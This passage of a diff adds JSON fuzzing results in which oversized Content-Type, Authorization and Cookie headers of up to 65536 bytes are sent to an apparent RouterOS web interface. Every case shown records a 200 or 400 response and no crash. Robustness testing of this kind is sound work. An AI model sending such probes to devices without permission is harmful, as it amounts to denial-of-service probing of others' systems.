+      "description": "Send Content-Type header with 512-byte value",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:03:53.016637",
+      "details": {
+        "payload_size": 583,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nContent-Type: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 583 chars]",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:48 GMT\r\nExpires: Tue, 16 Feb 2027 21:43:48 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h4m30s",
+        "uptime_after": "2h4m30s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 19,
+      "category": "oversized_headers",
+      "name": "Content-Type 1024B",
+      "description": "Send Content-Type header with 1024-byte value",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:03:53.836227",
+      "details": {
+        "payload_size": 1095,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nContent-Type: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 1095 chars]",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:49 GMT\r\nExpires: Tue, 16 Feb 2027 21:43:49 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h4m31s",
+        "uptime_after": "2h4m31s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 20,
+      "category": "oversized_headers",
+      "name": "Content-Type 2048B",
+      "description": "Send Content-Type header with 2048-byte value",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:03:54.659815",
+      "details": {
+        "payload_size": 2119,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nContent-Type: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 2119 chars]",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:49 GMT\r\nExpires: Tue, 16 Feb 2027 21:43:49 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h4m32s",
+        "uptime_after": "2h4m32s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 21,
+      "category": "oversized_headers",
+      "name": "Content-Type 4096B",
+      "description": "Send Content-Type header with 4096-byte value",
+      "result": "Response: HTTP/1.0 400 Bad Request (639 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:03:55.483403",
+      "details": {
+        "payload_size": 4167,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nContent-Type: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 4167 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:50 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\nHTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:50 GMT\r\nExpires: 0\r\nPragma: no-ca... [truncated, total 639 chars]",
+        "error": null,
+        "uptime_before": "2h4m33s",
+        "uptime_after": "2h4m33s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 22,
+      "category": "oversized_headers",
+      "name": "Content-Type 8192B",
+      "description": "Send Content-Type header with 8192-byte value",
+      "result": "Response: HTTP/1.0 400 Bad Request (322 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:03:56.302993",
+      "details": {
+        "payload_size": 8263,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nContent-Type: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 8263 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:51 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h4m33s",
+        "uptime_after": "2h4m34s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 23,
+      "category": "oversized_headers",
+      "name": "Content-Type 16384B",
+      "description": "Send Content-Type header with 16384-byte value",
+      "result": "Response: HTTP/1.0 400 Bad Request (322 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:03:57.134577",
+      "details": {
+        "payload_size": 16455,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nContent-Type: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 16455 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:52 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h4m34s",
+        "uptime_after": "2h4m35s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 24,
+      "category": "oversized_headers",
+      "name": "Content-Type 65536B",
+      "description": "Send Content-Type header with 65536-byte value",
+      "result": "Response: HTTP/1.0 400 Bad Request (322 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:03:57.962163",
+      "details": {
+        "payload_size": 65607,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nContent-Type: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 65607 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:53 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h4m35s",
+        "uptime_after": "2h4m35s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 25,
+      "category": "oversized_headers",
+      "name": "Authorization 256B",
+      "description": "Send Authorization header with 256-byte value",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:03:58.781753",
+      "details": {
+        "payload_size": 328,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nAuthorization: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 328 chars]",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:54 GMT\r\nExpires: Tue, 16 Feb 2027 21:43:54 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h4m36s",
+        "uptime_after": "2h4m36s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 26,
+      "category": "oversized_headers",
+      "name": "Authorization 512B",
+      "description": "Send Authorization header with 512-byte value",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:03:59.601343",
+      "details": {
+        "payload_size": 584,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nAuthorization: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 584 chars]",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:54 GMT\r\nExpires: Tue, 16 Feb 2027 21:43:54 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h4m37s",
+        "uptime_after": "2h4m37s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 27,
+      "category": "oversized_headers",
+      "name": "Authorization 1024B",
+      "description": "Send Authorization header with 1024-byte value",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:00.436925",
+      "details": {
+        "payload_size": 1096,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nAuthorization: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 1096 chars]",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:55 GMT\r\nExpires: Tue, 16 Feb 2027 21:43:55 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h4m38s",
+        "uptime_after": "2h4m38s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 28,
+      "category": "oversized_headers",
+      "name": "Authorization 2048B",
+      "description": "Send Authorization header with 2048-byte value",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:01.268509",
+      "details": {
+        "payload_size": 2120,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nAuthorization: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 2120 chars]",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:56 GMT\r\nExpires: Tue, 16 Feb 2027 21:43:56 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h4m38s",
+        "uptime_after": "2h4m39s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 29,
+      "category": "oversized_headers",
+      "name": "Authorization 4096B",
+      "description": "Send Authorization header with 4096-byte value",
+      "result": "Response: HTTP/1.0 400 Bad Request (639 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:02.100093",
+      "details": {
+        "payload_size": 4168,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nAuthorization: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 4168 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:57 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\nHTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:57 GMT\r\nExpires: 0\r\nPragma: no-ca... [truncated, total 639 chars]",
+        "error": null,
+        "uptime_before": "2h4m39s",
+        "uptime_after": "2h4m40s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 30,
+      "category": "oversized_headers",
+      "name": "Authorization 8192B",
+      "description": "Send Authorization header with 8192-byte value",
+      "result": "Response: HTTP/1.0 400 Bad Request (639 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:02.919683",
+      "details": {
+        "payload_size": 8264,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nAuthorization: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 8264 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:58 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\nHTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:58 GMT\r\nExpires: 0\r\nPragma: no-ca... [truncated, total 639 chars]",
+        "error": null,
+        "uptime_before": "2h4m40s",
+        "uptime_after": "2h4m40s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 31,
+      "category": "oversized_headers",
+      "name": "Authorization 16384B",
+      "description": "Send Authorization header with 16384-byte value",
+      "result": "Response: HTTP/1.0 400 Bad Request (322 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:03.743271",
+      "details": {
+        "payload_size": 16456,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nAuthorization: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 16456 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:59 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h4m41s",
+        "uptime_after": "2h4m41s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 32,
+      "category": "oversized_headers",
+      "name": "Authorization 65536B",
+      "description": "Send Authorization header with 65536-byte value",
+      "result": "Response: HTTP/1.0 400 Bad Request (322 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:04.562861",
+      "details": {
+        "payload_size": 65608,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nAuthorization: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 65608 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:59 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h4m42s",
+        "uptime_after": "2h4m42s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 33,
+      "category": "oversized_headers",
+      "name": "Cookie 256B",
+      "description": "Send Cookie header with 256-byte value",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:05.382451",
+      "details": {
+        "payload_size": 321,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nCookie: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n... [truncated, total 321 chars]",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:00 GMT\r\nExpires: Tue, 16 Feb 2027 21:44:00 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h4m43s",
+        "uptime_after": "2h4m43s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 34,
+      "category": "oversized_headers",
+      "name": "Cookie 512B",
+      "description": "Send Cookie header with 512-byte value",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:06.210037",
+      "details": {
+        "payload_size": 577,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nCookie: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 577 chars]",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:01 GMT\r\nExpires: Tue, 16 Feb 2027 21:44:01 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h4m43s",
+        "uptime_after": "2h4m44s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 35,
+      "category": "oversized_headers",
+      "name": "Cookie 1024B",
+      "description": "Send Cookie header with 1024-byte value",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:07.049617",
+      "details": {
+        "payload_size": 1089,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nCookie: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 1089 chars]",
